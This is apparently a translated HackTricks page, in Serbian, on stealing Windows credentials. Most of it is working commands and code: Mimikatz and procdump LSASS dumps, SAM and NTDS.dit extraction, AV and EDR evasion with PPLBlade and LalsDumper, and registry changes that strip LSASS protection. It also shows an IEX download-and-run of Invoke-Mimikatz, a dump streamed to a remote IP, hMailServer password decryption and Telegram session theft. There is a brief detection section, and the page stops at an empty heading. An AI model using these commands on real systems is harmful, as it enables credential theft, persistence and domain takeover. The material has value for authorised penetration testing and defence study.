# Krađa Windows akreditiva

{{#include ../../banners/hacktricks-training.md}}

## Akreditivi Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Pronađite šta još Mimikatz može da uradi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Saznajte više o nekim mogućim zaštitama akreditiva ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izvuče neke akreditive.**

## Akreditivi pomoću Meterpreter-a

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **koji** sam kreirao za **pretragu lozinki i hash-eva** na žrtvi.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Zaobilaženje AV-a

### Procdump + Mimikatz

Pošto je **Procdump iz** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**legitimni Microsoft alat**, Defender ga ne detektuje.\
Ovaj alat možete koristiti za **dump lsass procesa**, **preuzimanje dump-a** i **lokalno izdvajanje** **akreditiva** iz dump-a.

Možete koristiti i [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Ovaj proces se obavlja automatski pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu da **detektuju** upotrebu programa **procdump.exe za dumpovanje lsass.exe** kao **zlonamernu**, jer **detektuju** stringove **"procdump.exe" i "lsass.exe"**. Zato je **prikrivenije** proslediti **PID** procesa lsass.exe kao **argument** programu procdump, **umesto** naziva lsass.exe.

### Dumpovanje lsass-a pomoću **comsvcs.dll**

DLL pod nazivom **comsvcs.dll**, koji se nalazi u `C:\Windows\System32`, odgovoran je za **dumpovanje memorije procesa** u slučaju pada. Ovaj DLL sadrži **funkciju** pod nazivom **`MiniDumpW`**, koja je osmišljena tako da se poziva pomoću `rundll32.exe`.\
Prva dva argumenta nisu bitna, ali je treći podeljen na tri komponente. ID procesa koji će se dumpovati čini prvu komponentu, lokacija dump datoteke predstavlja drugu, a treća komponenta mora biti reč **full**. Druge opcije ne postoje.\
Nakon parsiranja ove tri komponente, DLL kreira dump datoteku i u nju upisuje memoriju navedenog procesa.\
**comsvcs.dll** se može koristiti za dumpovanje procesa lsass, čime se izbegava potreba za otpremanjem i izvršavanjem programa procdump. Ovaj metod je detaljno opisan na adresi [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Za izvršavanje se koristi sledeća komanda:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Ovaj proces možete automatizovati pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Pravljenje dump-a lsass-a pomoću Task Manager-a**

1. Kliknite desnim tasterom miša na Task Bar, a zatim kliknite na Task Manager
2. Kliknite na More details
3. Na kartici Processes pronađite proces „Local Security Authority Process“
4. Kliknite desnim tasterom miša na proces „Local Security Authority Process“, a zatim kliknite na „Create dump file“.

### Pravljenje dump-a lsass-a pomoću procdump-a

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je binarna datoteka sa Microsoft potpisom, koja je deo paketa [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Postojeći dump celog sistema nastao usled pada sistema ili njegova komprimovana kopija u dostupnoj korisničkoj fascikli mogu sadržati materijal za autentifikaciju koji se može analizirati offline. Imena datoteka kao što su `MEMORY.DMP` i `MEMORY.7z` samo su smernice za pregled: proverite poreklo i pristup i nemojte pretpostavljati da sadrže upotrebljive ili aktuelne podatke za autentifikaciju.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Ekstrakcija kredencijala van mreže iz snapshotova VM-a

Čitljiva rezervna kopija VM-a može da sadrži sačuvanu **sliku memorije gosta**, čak i bez pristupa pokrenutom gostu ili LSASS-u. Za VMware pronađite metapodatke snapshot-a `.vmsn` i odgovarajući `.vmem`, ako postoji; nemojte ih mešati sa slikom diska `.vmdk`. `VMkatz` obrađuje ulazne datoteke snapshot-a ili direktorijuma VM-a i može da povrati [kredencijale Windows logon sesija](credentials-mimikatz.md), kao što su hash-evi i tiketi, iz memorije gosta. Može i da pregleda virtuelne diskove radi pronalaženja SAM/LSA podataka. Preduslov je pristup datotekama rezervne kopije, a ne debug privilegije na pokrenutoj VM.<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

Primer u Checkpoint-u oporavio je NT hash **lokalnog** Administrator naloga sa snimka samostalne VM mašine. Autentifikacija na domen uspela je tek nakon što je zasebno potvrđeno ponovno korišćenje lozinke; lokalni hash iz rezervne kopije nije sam po sebi domenски akreditiv. Na hostu sa ograničenom memorijom, VMkatz može da skenira i oslobađa stranice postepeno, ali kopiranje snimka na veći host za analizu i dalje može biti bolja opcija.<sup>[[17]](#references)[[18]](#references)</sup>

## Dumpovanje lsass-a uz PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za dumpovanje Protected Process-a koji podržava obfuskaciju memory dump-a i prenos na udaljene radne stanice, bez upisivanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Obfuskacija memory dump datoteka radi izbegavanja mehanizama Defender detekcije zasnovanih na potpisima
3. Otpremanje memory dump-a pomoću RAW i SMB metoda, bez upisivanja na disk (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – Dumping LSASS-a zasnovan na SSP-u bez MiniDumpWriteDump

Ink Dragon koristi trofazni dumper nazvan **LalsDumper**, koji nikada ne poziva `MiniDumpWriteDump`, pa se EDR hook-ovi na tom API-ju nikada ne aktiviraju:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – pretražuje `fdp.dll` u potrazi za placeholder-om koji se sastoji od 32 mala slova `d`, zamenjuje ga apsolutnom putanjom do `rtu.txt`, čuva izmenjeni DLL kao `nfdp.dll` i poziva `AddSecurityPackageA("nfdp","fdp")`. Time se **LSASS** primorava da učita zlonamerni DLL kao novog Security Support Provider-a (SSP).
2. **Stage 2 unutar LSASS-a** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, primenjuje XOR nad svakim bajtom pomoću `0x20` i mapira dekodirani blob u memoriju pre nego što preda izvršavanje.
3. **Stage 3 dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls** razrešene na osnovu heširanih API naziva (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Poseban export pod nazivom `Tom` otvara `%TEMP%\<pid>.ddt`, upisuje kompresovani LSASS dump u datoteku i zatvara handle kako bi exfiltration mogla da se obavi kasnije.

Napomene za operatera:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Stage 1 zamenjuje hardkodirani placeholder apsolutnom putanjom do `rtu.txt`, pa njihovo razdvajanje prekida lanac.
* Registracija se obavlja dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Tu vrednost možete unapred upisati sami kako bi LSASS ponovo učitavao SSP pri svakom pokretanju sistema.
* Datoteke `%TEMP%\*.ddt` su kompresovani dump-ovi. Dekompresujte ih lokalno, a zatim ih prosledite Mimikatz/Volatility alatima radi izvlačenja akreditiva.
* Za pokretanje `lals.exe` potrebne su admin/SeTcb privilegije kako bi `AddSecurityPackageA` uspeo; kada se poziv završi, LSASS neprimetno učitava lažni SSP i izvršava Stage 2.
* Uklanjanje DLL-a sa diska ne izbacuje ga iz LSASS-a. Ili obrišite unos iz registra i ponovo pokrenite LSASS (restartujte sistem), ili ga ostavite radi dugoročne persistence.

## CrackMapExec

### Dump SAM heševa

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Izbaci NTDS.dit sa ciljnog DC-а

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump istorije lozinki iz NTDS.dit sa ciljnog DC-a

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Prikaži atribut pwdLastSet za svaki nalog u NTDS.dit datoteci

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Krađa SAM-a i SYSTEM-a

Ove datoteke bi trebalo da se **nalaze** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih tek tako kopirati na uobičajen način** jer su zaštićene.

### Iz registra

Najlakši način da dođete do kopije ovih datoteka jeste da je preuzmete iz registra:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Preuzmite** te datoteke na svoju Kali mašinu i **izvucite hash vrednosti** pomoću:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Pomoću ove usluge možete kopirati zaštićene datoteke. Potrebna su vam administratorska prava.

Za drugačiji postupak koji koristi već izložene snimke na deljenom mrežnom resursu sa dozvolom za čitanje, pogledajte [SMB Previous Versions](../../network-services-pentesting/pentesting-smb/#read-previous-versions-exposed-by-a-share).

#### Using vssadmin

Binarna datoteka vssadmin dostupna je samo u verzijama Windows Server-а.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ali isto možete uraditi iz **Powershell**. Ovo je primer **kako da kopirate SAM datoteku** (korišćeni disk je „C:“ i datoteka se čuva u C:\users\Public), ali ovo možete koristiti za kopiranje bilo koje zaštićene datoteke:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kod iz knjige: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Na kraju, možete koristiti i [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da biste napravili kopiju datoteka SAM, SYSTEM i ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Akreditivi Active Directory-ja - NTDS.dit**

Datoteka **NTDS.dit** poznata je kao srce **Active Directory-ja** i sadrži ključne podatke o korisničkim objektima, grupama i njihovim članstvima. U njoj se čuvaju **hash-evi lozinki** korisnika domena. Ova datoteka je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na putanji **_%SystemRoom%/NTDS/ntds.dit_**.

U ovoj bazi podataka održavaju se tri glavne tabele:

- **Data Table**: U ovoj tabeli čuvaju se detalji o objektima kao što su korisnici i grupe.
- **Link Table**: U njoj se prate odnosi, kao što su članstva u grupama.
- **SD Table**: Ovde se čuvaju **bezbednosni deskriptori** za svaki objekat, čime se obezbeđuju bezbednost i kontrola pristupa sačuvanim objektima.

Istraživanje Christoffera Anderssona o sloju baze podataka detaljnije dokumentuje ove tabele i njihovo ponašanje u različitim verzijama.<sup>[[8]](#references)</sup>

Windows koristi _Ntdsa.dll_ za interakciju s tom datotekom, a koristi je i _lsass.exe_. Zatim se **deo** datoteke **NTDS.dit** može nalaziti **u memoriji procesa `lsass`** (verovatno se tu nalazi poslednje korišćenim podacima zbog poboljšanja performansi upotrebom **keša**).

#### Dešifrovanje hash-eva unutar NTDS.dit

Hash je šifrovan tri puta:

1. Dešifrujte ključ za šifrovanje lozinki (**PEK**) pomoću **BOOTKEY**-ja i **RC4**-a.
2. Dešifrujte **hash** pomoću **PEK**-a i **RC4**-a.
3. Dešifrujte **hash** pomoću **DES**-a.

**PEK** ima **istu vrednost na svakom kontroleru domena**, ali je **šifrovan** unutar **NTDS.dit** datoteke pomoću **BOOTKEY**-ja specifičnog za kontroler domena, iz njegovog registra **SYSTEM**. Zato su za izvlačenje akreditiva potrebne i datoteke **NTDS.dit** i **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Zasebna [tehnika preusmeravanja tabele kernel handle-ova](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) može da kopira već otvoren NTDS objekat datoteke bez VSS-a, ali zahteva primitivu za proizvoljno čitanje i pisanje u kernelu na kontroleru domena.<sup>[[16]](#references)</sup>

### Kopiranje NTDS.dit datoteke pomoću Ntdsutil

Dostupno od Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Možete koristiti i trik [**volume shadow copy**](#stealing-sam-and-system) da kopirate datoteku **ntds.dit**. Imajte na umu da će vam biti potrebna i kopija datoteke **SYSTEM** (opet, možete je [**izvući iz registry-ja ili koristiti trik volume shadow copy**](#stealing-sam-and-system)).

### **Izdvajanje hash vrednosti iz NTDS.dit**

Kada **pribavite** datoteke **NTDS.dit** i **SYSTEM**, možete koristiti alate kao što je _secretsdump.py_ da **izdvojite hash vrednosti**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Možete ih i **automatski izdvojiti** koristeći važeći korisnički nalog administratora domena:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Za **velike NTDS.dit datoteke** preporučuje se izdvajanje pomoću [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na kraju, možete koristiti i **metasploit modul**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Izdvajanje objekata domena iz NTDS.dit datoteke u SQLite bazu podataka**

NTDS objekti mogu da se izdvoje u SQLite bazu podataka pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Izdvajaju se ne samo tajne već i čitavi objekti i njihovi atributi, što omogućava dalje izdvajanje informacija kada je sirova NTDS.dit datoteka već preuzeta.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

The `SYSTEM` hive je opcionalan, ali omogućava dešifrovanje tajni (NT i LM hash-eva, dodatnih akreditiva kao što su lozinke u čistom tekstu, Kerberos ili trust ključevi, istorija NT i LM lozinki). Između ostalih informacija, izdvajaju se sledeći podaci: korisnički i mašinski nalozi sa njihovim hash-evima, UAC zastavice, vremenske oznake poslednje prijave i promene lozinke, opisi naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstva, pouzdani domeni sa tipom, smerom i atributima trust odnosa...

## Lazagne

Preuzmite binarni fajl [ovde](https://github.com/AlessandroZ/LaZagne/releases). Ovaj binarni fajl možete koristiti za izdvajanje akreditiva iz različitih softvera.

```
lazagne.exe all
```

## Drugi alati za izvlačenje akreditiva iz SAM-a i LSASS-a

### Windows credentials Editor (WCE)

Ovaj alat se može koristiti za izvlačenje akreditiva iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izvlači akreditive iz SAM datoteke

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Izdvojite akreditive iz SAM datoteke

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Preuzmite ga sa:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo ga **pokrenite**; lozinke će biti izdvojene.

## Prikupljanje podataka iz neaktivnih RDP sesija i slabljenje bezbednosnih kontrola

Ink Dragon-ov FinalDraft RAT uključuje tasker `DumpRDPHistory`, čije su tehnike korisne svakom red-teamer-u:<sup>[[3]](#references)</sup>

### Prikupljanje telemetrije u stilu DumpRDPHistory

* **Odredišta odlaznih RDP veza** – parsirajte svaki korisnički hive na lokaciji `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki potključ čuva ime servera, `UsernameHint` i vremensku oznaku poslednjeg upisa. FinalDraft-ovu logiku možete da reprodukujete pomoću PowerShell-a:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Dokazi o dolaznim RDP vezama** – pretražite dnevnik `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` za ID-jeve događaja **21** (uspešna prijava) i **25** (prekid veze) da biste utvrdili ko je administrirao računar:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Kada saznate koji se Domain Admin redovno povezuje, dump-ujte LSASS (pomoću LalsDumper/Mimikatz) dok njegova **diskonektovana** sesija još postoji. CredSSP + NTLM fallback ostavlja njegov verifier i tokene u LSASS-u, koji se zatim mogu replay-ovati preko SMB/WinRM-a da bi se preuzeo `NTDS.dit` ili postavila perzistencija na kontrolerima domena.

### Registry downgrade-ovi koje cilja FinalDraft

Isti implant takođe menja nekoliko ključeva registra kako bi olakšao krađu akreditiva:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` onemogućava Restricted Admin za dolazni RDP; **ne** omogućava pass-the-hash kroz taj režim. Postavljanje vrednosti na `0` dozvoljava Restricted Admin na odredištu, ali klijent mora da zatraži `/RestrictedAdmin` ili da koristi smernicu koja zahteva Restricted Admin.<sup>[[14]](#references)</sup> Sam hash ne daje udaljena administratorska prava; pogledajte [preduslove za RDP autentifikaciju](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` onemogućava UAC filtriranje tokena, pa lokalni administratori preko mreže dobijaju neograničene tokene.
* `DSRMAdminLogonBehavior=2` omogućava DSRM administratoru da se prijavi dok je DC na mreži, čime napadači dobijaju još jedan ugrađeni nalog sa visokim privilegijama.
* `RunAsPPL=0` uklanja LSASS PPL zaštite, pa alati za izvlačenje dumpova, kao što je LalsDumper, mogu lako da pristupe memoriji.

## Akreditivi za konfiguraciju hMailServer-a (nakon kompromitovanja)

Proverite tačne konfiguracione datoteke `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` i `C:\ProgramData\hMailServer\hMailServer.ini`, u zavisnosti od rasporeda instalacije. Čitljiva vrednost `[Security] AdministratorPassword=` koja nije prazna predstavlja hash administratorske lozinke hMailServer-a; ona nije dokaz da je reč o lozinci Windows Administrator naloga. Ako se taj akreditiv otkrije, prelazak na Windows nalog zahteva nezavisno potvrđenu ponovnu upotrebu lozinke i pravo prijavljivanja.

Kod instalacija koje koriste SQL CE bazu podataka, zasebna vrednost `[Database] Password=` u INI datoteci štiti bazu podataka. U zastarelim instalacijama ova vrednost je šifrovana Blowfish-om pomoću statičkog ključa `THIS_KEY_IS_NOT_SECRET` i zamene endianness-a 4-bajtnih reči. Upotrebite heksadecimalni niz iz INI datoteke uz ovaj Python isečak:<sup>[[2]](#references)</sup>

Najpre potvrdite da tekući nalog može da čita **i** INI datoteku **i** odgovarajuću SQL CE `.sdf` bazu podataka. Lozinka iz INI datoteke štiti bazu podataka; ona je odvojena od hash-ova lozinki poštanskih sandučića koji se čuvaju unutar nje. Pregледajte alebo nadogradite **kopiju** baze podataka koja je u upotrebi, nikada živu datoteku.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Sa lozinkom u čistom tekstu, kopirajte SQL CE bazu podataka da biste izbegli zaključavanje datoteke, učitajte 32-bitni provider i nadogradite ga ako je potrebno pre slanja upita za hash vrednosti:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Kolona `accountpassword` koristi hMailServer format heša (režim `1421` u hashcat-u). Probijena lozinka poštanskog sandučeta omogućava prelazak na Windows korisnički nalog samo ako tu lozinku koristi i lokalni/n domenski nalog i ako taj nalog ima potrebna prava za udaljenu prijavu.

## Presretanje LSA Logon Callback-a (LsaApLogonUserEx2)

Neki alati hvataju **plaintext lozinke za prijavu** presretanjem LSA logon callback-a `LsaApLogonUserEx2`. Ideja je da se zakači ili obmota callback autentifikacionog paketa kako bi se akreditivi uhvatili **tokom prijave** (pre heširanja), a zatim zapisali na disk ili prosledili operateru. To se obično implementira kao pomoćni program koji se ubacuje u LSA ili se u njega registruje, a zatim beleži svaki uspešan interaktivni/mrežni logon događaj sa korisničkim imenom, domenom i lozinkom.<sup>[[1]](#references)</sup>

Operativne napomene:
- Potrebna su lokalna admin/SYSTEM prava za učitavanje pomoćnog programa u putanju autentifikacije.
- Uhvaćeni akreditivi pojavljuju se samo kada dođe do logon-a (interaktivnog, RDP, servisnog ili mrežnog, u zavisnosti od hook-a).

## Sačuvani akreditivi za povezivanje u SSMS-u (sqlstudio.bin)

SQL Server Management Studio (SSMS) čuva informacije o sačuvanim povezivanjima u korisničkoj datoteci `sqlstudio.bin`. Namenski dumpers mogu da parsiraju datoteku i povrate sačuvane SQL akreditive. U shell-ovima koji vraćaju samo izlaz komandi, datoteka se često eksfiltrira tako što se kodira kao Base64 i ispisuje na stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Na strani operatera ponovo napravite datoteku i lokalno pokrenite dumper da biste preuzeli akreditive:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Krađa browser sesije i kolačića putem Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Krađa Telegram Desktop `tdata` sesije

Telegram Desktop čuva autorizaciju i stanje naloga u direktorijumu **`tdata`**. Kopirana sesija može da se učita pomoću kompatibilnih alata radi autentifikacije bez lozinke naloga, dok god je ta autorizacija važeća; ako je omogućeno šifrovanje lokalnih podataka, stealeru je potrebna i šifra. Autentifikovana sesija zatim može da otkrije podatke o identitetu, metapodatke o dijalozima i članstvu, poruke i medije za preuzimanje.<sup>[[10]](#references)</sup>

### Pronalaženje i pribavljanje

Pretražite i instalirane i prenosive rasporede; nazivi paketa u Microsoft Store-u se razlikuju, pa izlistajte direktorijume paketa koji sadrže `TelegramMessenge` i pregledajte njihovo podstablo `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Ako obična čitanja ne uspeju, a token procesa **već sadrži i omogućava** `SeBackupPrivilege`, pristup koji podržava pravljenje rezervnih kopija predstavlja rezervnu opciju; on ne pribavlja tu privilegiju niti podiže nivo privilegija procesa. `CreateFileW` sa `FILE_FLAG_BACKUP_SEMANTICS` može da zatraži semantiku pravljenja/obnavljanja rezervnih kopija i zaobiđe bezbednosne provere datoteka ako su potrebne privilegije tokena prisutne, ali sama zastavica ne zaobilazi nekompatibilno zaključavanje deljenja.<sup>[[10]](#references)[[11]](#references)</sup>

Za datoteke koje su trenutno zaključane napravite/pročitajte **Volume Shadow Copy**; za datoteke blokirane ACL-om, `robocopy /B` koristi režim pravljenja rezervnih kopija i zaobilazi ACL-ove datoteka i direktorijuma.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Implant koji vodi računa o propusnom opsegu može najpre da pošalje samo inventar putanja do datoteka, da primi identifikator snimka i putanje koje C2 već ima, pa da otpremi samo datoteke koje nedostaju. Zato i mali inkrementalni prenosi nakon rekurzivnog popisivanja `tdata` mogu ukazivati na uspešnu krađu sesije.<sup>[[10]](#references)</sup>

### Detekcija i suzbijanje

Povežite rekurzivni pristup direktorijumu `tdata` iz procesa koji nije Telegram sa omogućavanjem `SeBackupPrivilege`, otvaranjem datoteka uz semantiku rezervne kopije, aktivnošću VSS-a ili podređenim procesom `robocopy.exe` koji koristi `/B`. Takođe potražite brzo popisivanje direktorijuma `%APPDATA%` i `%LOCALAPPDATA%\Packages`, po kom slede odlazne veze iz istog procesa. Nakon компромитације, koristite **Podešavanja → Uređaji** (ili **Privatnost i bezbednost → Aktivne sesije**) da prekinete neprepoznate sesije; samo omogućavanje verifikacije u dva koraka ne opoziva već ukradeno ovlašćenje.<sup>[[10]](#references)[[13]](#references)</sup>

## Krađa akreditiva Passkeys / WebAuthn iz Chrome-a u Windows-u

